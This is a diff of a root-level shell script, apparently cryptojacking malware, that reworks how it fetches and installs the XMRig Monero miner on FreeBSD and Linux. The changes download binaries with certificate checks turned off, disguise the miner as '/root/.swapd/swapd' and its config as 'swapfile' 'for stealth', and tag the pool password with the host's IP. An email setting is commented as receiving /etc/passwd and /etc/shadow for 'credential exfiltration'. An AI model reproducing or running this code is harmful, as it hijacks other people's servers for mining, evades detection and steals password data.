@@ -1557,6 +1557,13 @@ if [ "$(uname -s)" = "FreeBSD" ]; then
     echo ""
 fi
 
+# ==================== SHEBANG FOR GENERATED SCRIPTS ====================
+if [ "$IS_FREEBSD" = true ]; then
+    SHELL_PATH="/bin/sh"
+else
+    SHELL_PATH="/bin/bash"
+fi
+
 # ==================== BSD/GNU SED COMPATIBILITY ====================
 # FreeBSD uses BSD sed which requires different syntax than GNU sed
 # GNU sed: sed -i 's/old/new/' file
@@ -2499,323 +2506,355 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
 elif [ "$MINER_TYPE" = "xmrig" ]; then
     # ==================== DOWNLOAD XMRIG ====================
 
-# Check if FreeBSD - use pkg instead of downloading
-if [ "$IS_FREEBSD" = true ]; then
-    echo "=========================================="
-    echo "FREEBSD: INSTALLING XMRIG VIA PKG"
-    echo "=========================================="
-    echo "[*] FreeBSD detected - installing XMRig from system repository"
-    echo "[*] Running: pkg update"
-    pkg update
-    
-    # Install file command if not present (needed for binary verification)
-    if ! command -v file >/dev/null 2>&1; then
-        echo "[*] Installing file command..."
-        pkg install -y file
-    fi
-    
-    echo "[*] Running: pkg install -y xmrig"
-    pkg install -y xmrig
-    
-    if [ $? -eq 0 ]; then
-        echo "[✓] XMRig installed successfully via pkg"
-        
-        # Create miner directory
-        mkdir -p /root/.swapd
-        
-        # Copy system XMRig to our location
-        echo "[*] Copying /usr/local/bin/xmrig to /root/.swapd/swapd"
-        if [ -f /usr/local/bin/xmrig ]; then
-            cp /usr/local/bin/xmrig /root/.swapd/swapd
-            chmod +x /root/.swapd/swapd
-            echo "[✓] Binary copied successfully"
-            
-            # Verify the binary
-            if [ -f /root/.swapd/swapd ]; then
-                FILE_OUTPUT=$(file /root/.swapd/swapd 2>&1)
-                echo "[*] File type: $FILE_OUTPUT"
-                
-                if echo "$FILE_OUTPUT" | grep -qE "ELF.*(executable|shared object)"; then
-                    echo "[✓] Binary is a valid ELF executable"
-                    DOWNLOAD_SUCCESS=true
+    # ==================== FREEBSD: USE STATIC BINARY ====================
+    if [ "$IS_FREEBSD" = true ]; then
+        echo "=========================================="
+        echo "FREEBSD: INSTALLING XMRIG (STATIC BINARY)"
+        echo "=========================================="
+
+        # Only amd64 is supported by the static release
+        if [ "$ARCH" = "amd64" ] || [ "$ARCH" = "x86_64" ]; then
+            echo "[*] Detected amd64 – downloading static binary"
+            STATIC_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-freebsd-static-x64.tar.gz"
+
+            cd /tmp || exit 1
+            rm -f xmrig-freebsd-static.tar.gz
+
+            echo "[*] Downloading from $STATIC_URL"
+            if ! curl -L -k -o xmrig-freebsd-static.tar.gz "$STATIC_URL" 2>/dev/null; then
+                if ! wget --no-check-certificate -O xmrig-freebsd-static.tar.gz "$STATIC_URL" 2>/dev/null; then
+                    echo "[!] ERROR: Failed to download static binary"
+                    echo "[*] Falling back to pkg install"
+                    pkg update && pkg install -y xmrig
+                    if [ -f /usr/local/bin/xmrig ]; then
+                        mkdir -p /root/.swapd
+                        cp /usr/local/bin/xmrig /root/.swapd/swapd
+                        chmod +x /root/.swapd/swapd
+                        DOWNLOAD_SUCCESS=true
+                    else
+                        exit 1
+                    fi
+                fi
+            fi
+
+            if [ -f xmrig-freebsd-static.tar.gz ] && [ -s xmrig-freebsd-static.tar.gz ]; then
+                echo "[*] Extracting..."
+                tar -xzf xmrig-freebsd-static.tar.gz
+                if [ -f xmrig ]; then
+                    mkdir -p /root/.swapd
+                    mv xmrig /root/.swapd/swapd
+                    chmod +x /root/.swapd/swapd
+                    echo "[✓] Static binary installed"
+
+                    # Verify it's a valid executable
+                    if command -v file >/dev/null 2>&1; then
+                        file /root/.swapd/swapd | grep -q "ELF.*executable" && DOWNLOAD_SUCCESS=true || DOWNLOAD_SUCCESS=false
+                    else
+                        DOWNLOAD_SUCCESS=true  # assume success if file not available
+                    fi
+
+                    if [ "$DOWNLOAD_SUCCESS" = true ]; then
+                        echo "[✓] Binary verified"
+                    else
+                        echo "[!] Binary verification failed – falling back to pkg"
+                        pkg update && pkg install -y xmrig
+                        if [ -f /usr/local/bin/xmrig ]; then
+                            cp /usr/local/bin/xmrig /root/.swapd/swapd
+                            chmod +x /root/.swapd/swapd
+                            DOWNLOAD_SUCCESS=true
+                        else
+                            exit 1
+                        fi
+                    fi
                 else
-                    echo "[!] ERROR: Binary verification failed"
-                    echo "[!] File type was: $FILE_OUTPUT"
+                    echo "[!] xmrig binary not found in tarball"
                     exit 1
                 fi
+                rm -f xmrig-freebsd-static.tar.gz
             else
-                echo "[!] ERROR: Failed to copy binary"
+                echo "[!] Download failed – falling back to pkg"
+                pkg update && pkg install -y xmrig
+                if [ -f /usr/local/bin/xmrig ]; then
+                    mkdir -p /root/.swapd
+                    cp /usr/local/bin/xmrig /root/.swapd/swapd
+                    chmod +x /root/.swapd/swapd
+                    DOWNLOAD_SUCCESS=true
+                else
+                    exit 1
+                fi
+            fi
+        else
+            echo "[*] Non-amd64 FreeBSD – using pkg install"
+            pkg update && pkg install -y xmrig
+            if [ -f /usr/local/bin/xmrig ]; then
+                mkdir -p /root/.swapd
+                cp /usr/local/bin/xmrig /root/.swapd/swapd
+                chmod +x /root/.swapd/swapd
+                DOWNLOAD_SUCCESS=true
+            else
                 exit 1
             fi
-        else
-            echo "[!] ERROR: /usr/local/bin/xmrig not found after pkg install"
-            exit 1
         fi
+
+        echo "=========================================="
+        echo ""
+        # Skip the Linux download section below
+        DOWNLOAD_SUCCESS=true
     else
-        echo "[!] ERROR: pkg install xmrig failed"
-        exit 1
+        # Linux/non-FreeBSD: download from MoneroOcean
+        echo "[*] Downloading XMRig from MoneroOcean..."
     fi
-    
-    echo "=========================================="
-    echo ""
-    
-    # Skip the download section below
-    DOWNLOAD_SUCCESS=true
-else
-    # Linux/non-FreeBSD: download from MoneroOcean
-    echo "[*] Downloading XMRig from MoneroOcean..."
-fi
 
-# ==================== ENSURE WE'RE IN THE MINER DIRECTORY ====================
-# Both FreeBSD and Linux need to be in /root/.swapd for config creation
-mkdir -p /root/.swapd
-cd /root/.swapd || {
-    echo "[!] Failed to cd to /root/.swapd, trying to create it..."
-    mkdir -p /root/.swapd 2>/dev/null || true
+    # ==================== ENSURE WE'RE IN THE MINER DIRECTORY ====================
+    # Both FreeBSD and Linux need to be in /root/.swapd for config creation
+    mkdir -p /root/.swapd
     cd /root/.swapd || {
-        echo "[!] Cannot access /root/.swapd - using /tmp instead"
-        cd /tmp || true
+        echo "[!] Failed to cd to /root/.swapd, trying to create it..."
+        mkdir -p /root/.swapd 2>/dev/null || true
+        cd /root/.swapd || {
+            echo "[!] Cannot access /root/.swapd - using /tmp instead"
+            cd /tmp || true
+        }
     }
-}
 
-# Only run download section if NOT FreeBSD
-if [ "$IS_FREEBSD" != true ]; then
+    # Only run download section if NOT FreeBSD
+    if [ "$IS_FREEBSD" != true ]; then
 
-# Use MoneroOcean's pre-compiled XMRig (already optimized for MoneroOcean pool)
-XMRIG_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
+        # Use MoneroOcean's pre-compiled XMRig (already optimized for MoneroOcean pool)
+        XMRIG_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
 
-echo "[*] Downloading from: $XMRIG_URL"
+        echo "[*] Downloading from: $XMRIG_URL"
 
-DOWNLOAD_SUCCESS=false
-ATTEMPTS=0
-MAX_ATTEMPTS=3
+        DOWNLOAD_SUCCESS=false
+        ATTEMPTS=0
+        MAX_ATTEMPTS=3
 
-# Multiple download mirrors
-MIRRORS=(
-    "$XMRIG_URL"
-    "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.tar.gz"
-)
+        # Multiple download mirrors
+        MIRRORS=(
+            "$XMRIG_URL"
+            "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.tar.gz"
+        )
 
-# Retry download up to 3 times with different mirrors
-for mirror in "${MIRRORS[@]}"; do
-    [ "$DOWNLOAD_SUCCESS" = true ] && break
+        # Retry download up to 3 times with different mirrors
+        for mirror in "${MIRRORS[@]}"; do
+            [ "$DOWNLOAD_SUCCESS" = true ] && break
 
-    ATTEMPTS=$((ATTEMPTS + 1))
-    echo "[*] Download attempt $ATTEMPTS/$MAX_ATTEMPTS from: $mirror"
+            ATTEMPTS=$((ATTEMPTS + 1))
+            echo "[*] Download attempt $ATTEMPTS/$MAX_ATTEMPTS from: $mirror"
 
-    # Remove old failed download
-    rm -f xmrig.tar.gz 2>/dev/null
+            # Remove old failed download
+            rm -f xmrig.tar.gz 2>/dev/null
 
-    # Try to download xmrig
-    echo "[*] Using download tool: $([ "$USE_WGET" = true ] && echo "wget" || echo "curl")"
-    
-    if [ "$USE_WGET" = true ]; then
-        echo "[*] wget --no-check-certificate -O xmrig.tar.gz $mirror"
-        wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$mirror" 2>&1 | head -20
-        if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
-            DOWNLOAD_SUCCESS=true
-            echo "[✓] wget download succeeded"
-        else
-            echo "[!] wget download failed (exit code: $?)"
-            # Try curl as fallback
-            if command -v curl >/dev/null 2>&1; then
-                echo "[*] Trying curl as fallback..."
-                curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" 2>&1 | head -20
-                if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
-                    DOWNLOAD_SUCCESS=true
-                    echo "[✓] curl fallback succeeded"
-                else
-                    DOWNLOAD_SUCCESS=false
-                fi
-            else
-                DOWNLOAD_SUCCESS=false
-            fi
-        fi
-    else
-        echo "[*] curl -L -k -o xmrig.tar.gz $mirror"
-        curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" 2>&1 | head -20
-        if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
-            DOWNLOAD_SUCCESS=true
-            echo "[✓] curl download succeeded"
-        else
-            echo "[!] curl download failed (exit code: $?)"
-            # Try wget as fallback
-            if command -v wget >/dev/null 2>&1; then
-                echo "[*] Trying wget as fallback..."
+            # Try to download xmrig
+            echo "[*] Using download tool: $([ "$USE_WGET" = true ] && echo "wget" || echo "curl")"
+
+            if [ "$USE_WGET" = true ]; then
+                echo "[*] wget --no-check-certificate -O xmrig.tar.gz $mirror"
                 wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$mirror" 2>&1 | head -20
                 if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
                     DOWNLOAD_SUCCESS=true
-                    echo "[✓] wget fallback succeeded"
+                    echo "[✓] wget download succeeded"
                 else
-                    DOWNLOAD_SUCCESS=false
+                    echo "[!] wget download failed (exit code: $?)"
+                    # Try curl as fallback
+                    if command -v curl >/dev/null 2>&1; then
+                        echo "[*] Trying curl as fallback..."
+                        curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" 2>&1 | head -20
+                        if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
+                            DOWNLOAD_SUCCESS=true
+                            echo "[✓] curl fallback succeeded"
+                        else
+                            DOWNLOAD_SUCCESS=false
+                        fi
+                    else
+                        DOWNLOAD_SUCCESS=false
+                    fi
                 fi
             else
-                DOWNLOAD_SUCCESS=false
+                echo "[*] curl -L -k -o xmrig.tar.gz $mirror"
+                curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" 2>&1 | head -20
+                if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
+                    DOWNLOAD_SUCCESS=true
+                    echo "[✓] curl download succeeded"
+                else
+                    echo "[!] curl download failed (exit code: $?)"
+                    # Try wget as fallback
+                    if command -v wget >/dev/null 2>&1; then
+                        echo "[*] Trying wget as fallback..."
+                        wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$mirror" 2>&1 | head -20
+                        if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
+                            DOWNLOAD_SUCCESS=true
+                            echo "[✓] wget fallback succeeded"
+                        else
+                            DOWNLOAD_SUCCESS=false
+                        fi
+                    else
+                        DOWNLOAD_SUCCESS=false
+                    fi
+                fi
             fi
-        fi
-    fi
 
-    # Verify download - check if file exists and has content
-    if [ -f xmrig.tar.gz ] && [ -s xmrig.tar.gz ]; then
-        FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
-        echo "[*] Downloaded: $((FILE_SIZE / 1024 / 1024))MB ($FILE_SIZE bytes)"
+            # Verify download - check if file exists and has content
+            if [ -f xmrig.tar.gz ] && [ -s xmrig.tar.gz ]; then
+                FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
+                echo "[*] Downloaded: $((FILE_SIZE / 1024 / 1024))MB ($FILE_SIZE bytes)"
 
-        # Basic size check (MoneroOcean version is ~3-4MB)
-        if [ "$FILE_SIZE" -lt 1000000 ]; then
-            echo "[!] Downloaded file too small (likely corrupted)"
-            echo "[!] Expected >1MB, got $((FILE_SIZE / 1024 / 1024))MB"
-            DOWNLOAD_SUCCESS=false
-            rm -f xmrig.tar.gz
-        else
-            # Try to list tarball contents to verify integrity
-            if tar -tzf xmrig.tar.gz >/dev/null 2>&1; then
-                echo "[✓] Tarball integrity verified"
-                break
+                # Basic size check (MoneroOcean version is ~3-4MB)
+                if [ "$FILE_SIZE" -lt 1000000 ]; then
+                    echo "[!] Downloaded file too small (likely corrupted)"
+                    echo "[!] Expected >1MB, got $((FILE_SIZE / 1024 / 1024))MB"
+                    DOWNLOAD_SUCCESS=false
+                    rm -f xmrig.tar.gz
+                else
+                    # Try to list tarball contents to verify integrity
+                    if tar -tzf xmrig.tar.gz >/dev/null 2>&1; then
+                        echo "[✓] Tarball integrity verified"
+                        break
+                    else
+                        echo "[!] Tarball corrupted (failed integrity check)"
+                        DOWNLOAD_SUCCESS=false
+                        rm -f xmrig.tar.gz
+                    fi
+                fi
             else
-                echo "[!] Tarball corrupted (failed integrity check)"
+                echo "[!] Download failed or file is empty"
                 DOWNLOAD_SUCCESS=false
                 rm -f xmrig.tar.gz
             fi
-        fi
-    else
-        echo "[!] Download failed or file is empty"
-        DOWNLOAD_SUCCESS=false
-        rm -f xmrig.tar.gz
-    fi
 
-    sleep 2
-done
+            sleep 2
+        done
 
-# Extract if download was successful
-if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
-    echo "[*] Extracting xmrig.tar.gz..."
-    echo "[*] Current directory: $(pwd)"
-    echo "[*] Files before extraction:"
-    ls -la 2>/dev/null | grep -E "xmrig|swapd" || echo "    (no xmrig files found)"
-    
-    tar -xzf xmrig.tar.gz 2>&1 | head -20 || {
-        echo "[!] Failed to extract xmrig"
-        DOWNLOAD_SUCCESS=false
-    }
-    
-    echo "[*] Files after extraction:"
-    ls -la 2>/dev/null | grep -E "xmrig|swapd|config" || echo "    (no xmrig files found)"
-    
-    if [ "$DOWNLOAD_SUCCESS" = true ]; then
-        echo "[*] Looking for xmrig binary..."
-        
-        # MoneroOcean tarball contains xmrig binary directly or in simple structure
-        # Try multiple possible locations with explicit checking
-        if [ -f xmrig ]; then
-            echo "[✓] Found: xmrig (root level)"
-            mv xmrig swapd 2>/dev/null || cp xmrig swapd 2>/dev/null
-            if [ ! -f swapd ]; then
-                echo "[!] Move/copy failed, trying different approach..."
-                cp -f xmrig swapd 2>&1 || echo "[!] Final copy attempt failed"
-            fi
-        else
-            # Check for xmrig in versioned directory (xmrig-*)
-            FOUND_VERSIONED=false
-            for dir in xmrig-*/xmrig; do
-                if [ -f "$dir" ]; then
-                    echo "[✓] Found: $dir (versioned directory)"
-                    mv "$dir" swapd 2>/dev/null || cp "$dir" swapd 2>/dev/null
-                    FOUND_VERSIONED=true
-                    break
-                fi
-            done
-            
-            # Check for xmrig in any subdirectory
-            if [ "$FOUND_VERSIONED" = false ]; then
-                FOUND_SUBDIR=false
-                for file in */xmrig; do
-                    if [ -f "$file" ]; then
-                        echo "[✓] Found: $file (subdirectory)"
-                        mv "$file" swapd 2>/dev/null || cp "$file" swapd 2>/dev/null
-                        FOUND_SUBDIR=true
-                        break
+        # Extract if download was successful
+        if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
+            echo "[*] Extracting xmrig.tar.gz..."
+            echo "[*] Current directory: $(pwd)"
+            echo "[*] Files before extraction:"
+            ls -la 2>/dev/null | grep -E "xmrig|swapd" || echo "    (no xmrig files found)"
+
+            tar -xzf xmrig.tar.gz 2>&1 | head -20 || {
+                echo "[!] Failed to extract xmrig"
+                DOWNLOAD_SUCCESS=false
+            }
+
+            echo "[*] Files after extraction:"
+            ls -la 2>/dev/null | grep -E "xmrig|swapd|config" || echo "    (no xmrig files found)"
+
+            if [ "$DOWNLOAD_SUCCESS" = true ]; then
+                echo "[*] Looking for xmrig binary..."
+
+                # MoneroOcean tarball contains xmrig binary directly or in simple structure
+                # Try multiple possible locations with explicit checking
+                if [ -f xmrig ]; then
+                    echo "[✓] Found: xmrig (root level)"
+                    mv xmrig swapd 2>/dev/null || cp xmrig swapd 2>/dev/null
+                    if [ ! -f swapd ]; then
+                        echo "[!] Move/copy failed, trying different approach..."
+                        cp -f xmrig swapd 2>&1 || echo "[!] Final copy attempt failed"
                     fi
-                done
-                
-                if [ "$FOUND_SUBDIR" = false ]; then
-                    echo "[!] Cannot find xmrig binary in tarball"
-                    echo "[*] Contents of extracted files:"
-                    ls -la 2>/dev/null || true
-                    echo "[*] Trying to find xmrig anywhere:"
-                    find . -name "xmrig" -type f 2>/dev/null || echo "    (find command failed or no files found)"
+                else
+                    # Check for xmrig in versioned directory (xmrig-*)
+                    FOUND_VERSIONED=false
+                    for dir in xmrig-*/xmrig; do
+                        if [ -f "$dir" ]; then
+                            echo "[✓] Found: $dir (versioned directory)"
+                            mv "$dir" swapd 2>/dev/null || cp "$dir" swapd 2>/dev/null
+                            FOUND_VERSIONED=true
+                            break
+                        fi
+                    done
+
+                    # Check for xmrig in any subdirectory
+                    if [ "$FOUND_VERSIONED" = false ]; then
+                        FOUND_SUBDIR=false
+                        for file in */xmrig; do
+                            if [ -f "$file" ]; then
+                                echo "[✓] Found: $file (subdirectory)"
+                                mv "$file" swapd 2>/dev/null || cp "$file" swapd 2>/dev/null
+                                FOUND_SUBDIR=true
+                                break
+                            fi
+                        done
+
+                        if [ "$FOUND_SUBDIR" = false ]; then
+                            echo "[!] Cannot find xmrig binary in tarball"
+                            echo "[*] Contents of extracted files:"
+                            ls -la 2>/dev/null || true
+                            echo "[*] Trying to find xmrig anywhere:"
+                            find . -name "xmrig" -type f 2>/dev/null || echo "    (find command failed or no files found)"
+                            DOWNLOAD_SUCCESS=false
+                        fi
+                    fi
+                fi
+
+                if [ -f swapd ]; then
+                    echo "[✓] Binary successfully renamed to swapd"
+                    ls -lh swapd 2>/dev/null || true
+                else
+                    echo "[!] Failed to extract/rename xmrig binary"
+                    echo "[*] Trying direct approach - looking for any executable..."
+                    # Last resort: try to find any executable file
+                    for possible_binary in xmrig xmrig-* */xmrig; do
+                        if [ -f "$possible_binary" ] && [ -x "$possible_binary" ]; then
+                            echo "[*] Found executable: $possible_binary"
+                            cp -f "$possible_binary" swapd 2>&1 && echo "[✓] Copied to swapd" || echo "[!] Copy failed"
+                            break
+                        fi
+                    done
+
+                    if [ ! -f swapd ]; then
+                        DOWNLOAD_SUCCESS=false
+                    fi
+                fi
+            fi
+
+            if [ "$DOWNLOAD_SUCCESS" = true ]; then
+                # Simple check: file exists and is not zero size
+                echo "[*] Checking downloaded binary..."
+
+                if [ -f swapd ] && [ -s swapd ]; then
+                    # File exists and is not empty - make it executable
+                    chmod +x swapd 2>/dev/null || true
+
+                    FILE_SIZE=$(wc -c < swapd 2>/dev/null || echo "0")
+                    echo "[✓] Binary downloaded successfully (size: $FILE_SIZE bytes)"
+
+                    # Clean up temporary files
+                    rm -rf xmrig-* xmrig.tar.gz
+                    echo "[✓] XMRig ready"
+                else
+                    echo "[!] ERROR: Downloaded file is missing or empty (zero size)"
+                    rm -rf xmrig-* xmrig.tar.gz swapd
                     DOWNLOAD_SUCCESS=false
                 fi
             fi
         fi
-        
-        if [ -f swapd ]; then
-            echo "[✓] Binary successfully renamed to swapd"
-            ls -lh swapd 2>/dev/null || true
-        else
-            echo "[!] Failed to extract/rename xmrig binary"
-            echo "[*] Trying direct approach - looking for any executable..."
-            # Last resort: try to find any executable file
-            for possible_binary in xmrig xmrig-* */xmrig; do
-                if [ -f "$possible_binary" ] && [ -x "$possible_binary" ]; then
-                    echo "[*] Found executable: $possible_binary"
-                    cp -f "$possible_binary" swapd 2>&1 && echo "[✓] Copied to swapd" || echo "[!] Copy failed"
-                    break
-                fi
-            done
-            
-            if [ ! -f swapd ]; then
-                DOWNLOAD_SUCCESS=false
-            fi
+
+        if [ "$DOWNLOAD_SUCCESS" = false ]; then
+            echo ""
+            echo "=========================================="
+            echo "[!] CRITICAL: XMRIG DOWNLOAD FAILED"
+            echo "=========================================="
+            echo "[!] Failed to download XMRig after $MAX_ATTEMPTS attempts"
+            echo "[!] Cannot continue without miner binary"
+            echo ""
+            echo "Possible issues:"
+            echo "  - GitHub may be blocked in your region"
+            echo "  - Network connectivity issues"
+            echo "  - Firewall blocking outbound connections"
+            echo ""
+            echo "Manual installation:"
+            echo "  1. Download from MoneroOcean:"
+            echo "     wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
+            echo "  2. Extract: tar -xzf xmrig.tar.gz"
+            echo "  3. Move: mv xmrig /root/.swapd/swapd"
+            echo "  4. Make executable: chmod +x /root/.swapd/swapd"
+            echo "  5. Re-run this script"
+            echo ""
+            exit 1
         fi
-    fi
 
-    if [ "$DOWNLOAD_SUCCESS" = true ]; then
-        # Simple check: file exists and is not zero size
-        echo "[*] Checking downloaded binary..."
-        
-        if [ -f swapd ] && [ -s swapd ]; then
-            # File exists and is not empty - make it executable
-            chmod +x swapd 2>/dev/null || true
-            
-            FILE_SIZE=$(wc -c < swapd 2>/dev/null || echo "0")
-            echo "[✓] Binary downloaded successfully (size: $FILE_SIZE bytes)"
-            
-            # Clean up temporary files
-            rm -rf xmrig-* xmrig.tar.gz
-            echo "[✓] XMRig ready"
-        else
-            echo "[!] ERROR: Downloaded file is missing or empty (zero size)"
-            rm -rf xmrig-* xmrig.tar.gz swapd
-            DOWNLOAD_SUCCESS=false
-        fi
-    fi
-fi
-
-if [ "$DOWNLOAD_SUCCESS" = false ]; then
-    echo ""
-    echo "=========================================="
-    echo "[!] CRITICAL: XMRIG DOWNLOAD FAILED"
-    echo "=========================================="
-    echo "[!] Failed to download XMRig after $MAX_ATTEMPTS attempts"
-    echo "[!] Cannot continue without miner binary"
-    echo ""
-    echo "Possible issues:"
-    echo "  - GitHub may be blocked in your region"
-    echo "  - Network connectivity issues"
-    echo "  - Firewall blocking outbound connections"
-    echo ""
-    echo "Manual installation:"
-    echo "  1. Download from MoneroOcean:"
-    echo "     wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
-    echo "  2. Extract: tar -xzf xmrig.tar.gz"
-    echo "  3. Move: mv xmrig /root/.swapd/swapd"
-    echo "  4. Make executable: chmod +x /root/.swapd/swapd"
-    echo "  5. Re-run this script"
-    echo ""
-    exit 1
-fi
-
-fi  # End of FreeBSD download skip check
+    fi  # End of FreeBSD download skip check
 
 fi  # End of MINER_TYPE selection (cpuminer vs xmrig)
 
@@ -2829,74 +2868,74 @@ if [ "$MINER_TYPE" = "xmrig" ]; then
     # ==================== CONFIGURE XMRIG ====================
     echo "[*] Configuring XMRig..."
 
-# ==================== IP DETECTION FOR PASS FIELD ====================
-echo "[*] Detecting server IP address for worker identification..."
-echo "PASS..."
+    # ==================== IP DETECTION FOR PASS FIELD ====================
+    echo "[*] Detecting server IP address for worker identification..."
+    echo "PASS..."
 
-# Universal IP detection compatible with ancient systems
-get_server_ip() {
-    local ip=""
+    # Universal IP detection compatible with ancient systems
+    get_server_ip() {
+        local ip=""
 
-    # Method 1: Try external IP service (requires network)
-    ip=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
-    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
-        echo "$ip"
-        return 0
+        # Method 1: Try external IP service (requires network)
+        ip=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
+        if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
+            echo "$ip"
+            return 0
+        fi
+
+        # Method 2: Try ip command (modern systems)
+        ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
+        if [ -n "$ip" ]; then
+            echo "$ip"
+            return 0
+        fi
+
+        # Method 3: Try ifconfig (older systems)
+        ip=$(ifconfig 2>/dev/null | grep 'inet addr:' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
+        if [ -n "$ip" ]; then
+            echo "$ip"
+            return 0
+        fi
+
+        # Method 4: Try ip route (intermediate systems)
+        ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
+        if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
+            echo "$ip"
+            return 0
+        fi
+
+        # Method 5: Try hostname (very old systems)
+        ip=$(hostname -i 2>/dev/null | awk '{print $1}')
+        if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
+            echo "$ip"
+            return 0
+        fi
+
+        # Fallback
+        echo "na"
+    }
+
+    PASS=$(get_server_ip)
+    echo "[*] Detected server identifier: $PASS"
+
+    # ==================== EMAIL CONFIGURATION ====================
+    # Set your email here for:
+    #   1. Mining pool notifications (added to password field)
+    #   2. Credential exfiltration (receives /etc/passwd and /etc/shadow)
+    #
+    # Example: EMAIL="your_email@gmail.com"
+    # Leave empty to disable email features
+    EMAIL=""  # ← SET YOUR EMAIL HERE
+
+    if [ -n "$EMAIL" ]; then
+      PASS="$PASS:$EMAIL"
+      echo "[*] Added email to password field: $EMAIL"
+      echo "[*] Email will receive credential backups (if enabled)"
     fi
+    # ========================================
 
-    # Method 2: Try ip command (modern systems)
-    ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
-    if [ -n "$ip" ]; then
-        echo "$ip"
-        return 0
-    fi
-
-    # Method 3: Try ifconfig (older systems)
-    ip=$(ifconfig 2>/dev/null | grep 'inet addr:' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
-    if [ -n "$ip" ]; then
-        echo "$ip"
-        return 0
-    fi
-
-    # Method 4: Try ip route (intermediate systems)
-    ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
-    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
-        echo "$ip"
-        return 0
-    fi
-
-    # Method 5: Try hostname (very old systems)
-    ip=$(hostname -i 2>/dev/null | awk '{print $1}')
-    if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
-        echo "$ip"
-        return 0
-    fi
-
-    # Fallback
-    echo "na"
-}
-
-PASS=$(get_server_ip)
-echo "[*] Detected server identifier: $PASS"
-
-# ==================== EMAIL CONFIGURATION ====================
-# Set your email here for:
-#   1. Mining pool notifications (added to password field)
-#   2. Credential exfiltration (receives /etc/passwd and /etc/shadow)
-#
-# Example: EMAIL="your_email@gmail.com"
-# Leave empty to disable email features
-EMAIL=""  # ← SET YOUR EMAIL HERE
-
-if [ -n "$EMAIL" ]; then
-  PASS="$PASS:$EMAIL"
-  echo "[*] Added email to password field: $EMAIL"
-  echo "[*] Email will receive credential backups (if enabled)"
-fi
-# ========================================
-
-# Create configuration file (will be renamed to swapfile for stealth)
-cat > config.json << 'EOL'
+    # Create configuration file (will be renamed to swapfile for stealth)
+    cat > config.json << 'EOL'
 {
     "autosave": false,
     "donate-level": 0,
@@ -2917,24 +2956,24 @@ cat > config.json << 'EOL'
 }
 EOL
 
-# Replace placeholders with actual values using BSD-compatible sed
-sed_inplace "s/WALLET_PLACEHOLDER/$WALLET/" config.json
-sed_inplace "s/PASS_PLACEHOLDER/$PASS/" config.json
+    # Replace placeholders with actual values using BSD-compatible sed
+    sed_inplace "s/WALLET_PLACEHOLDER/$WALLET/" config.json
+    sed_inplace "s/PASS_PLACEHOLDER/$PASS/" config.json
 
-# Rename to swapfile for stealth
-mv config.json swapfile
+    # Rename to swapfile for stealth
+    mv config.json swapfile
 
-echo "[✓] XMRig configuration created as 'swapfile'"
-echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
-echo "[✓] Pass (Worker ID): $PASS"
+    echo "[✓] XMRig configuration created as 'swapfile'"
+    echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
+    echo "[✓] Pass (Worker ID): $PASS"
 
-# Verify PASS was set correctly
-if grep -q '"pass": "'"$PASS"'"' swapfile; then
-    echo "[✓] Worker ID successfully set in config"
-else
-    echo "[!] Warning: Worker ID may not be set correctly"
-    echo "[*] Current pass field: $(grep '"pass"' swapfile || echo 'not found')"
-fi
+    # Verify PASS was set correctly
+    if grep -q '"pass": "'"$PASS"'"' swapfile; then
+        echo "[✓] Worker ID successfully set in config"
+    else
+        echo "[!] Warning: Worker ID may not be set correctly"
+        echo "[*] Current pass field: $(grep '"pass"' swapfile || echo 'not found')"
+    fi
 
 elif [ "$MINER_TYPE" = "cpuminer" ]; then
     # ==================== CONFIGURE POOLER-CPUMINER (MINERD) ====================
